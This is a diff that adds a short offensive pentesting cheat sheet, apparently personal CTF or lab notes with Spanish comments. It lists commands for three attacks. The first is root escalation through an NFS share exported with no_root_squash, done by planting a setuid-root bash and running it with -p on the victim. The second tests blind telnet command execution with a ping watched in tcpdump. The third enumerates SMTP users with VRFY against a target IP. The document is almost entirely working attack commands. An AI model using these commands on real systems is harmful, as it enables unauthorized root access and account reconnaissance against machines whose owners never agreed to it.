@@ -1,0 +1,15 @@
+# nfs no_root_squash exploit
+# atacante
+sudo mount -t nfs IP:share /tmp/mount/ -nolock
+cp /bin/bash /mnt/bash
+sudo chown root:root bash
+sudo chmod 4777 bash
+# victima
+./bash -p
+
+#telnet CE
+A> tcpdump -i tun0 icmp
+C> .RUN ping -c1 IP
+
+# smtp user enum
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.67.168
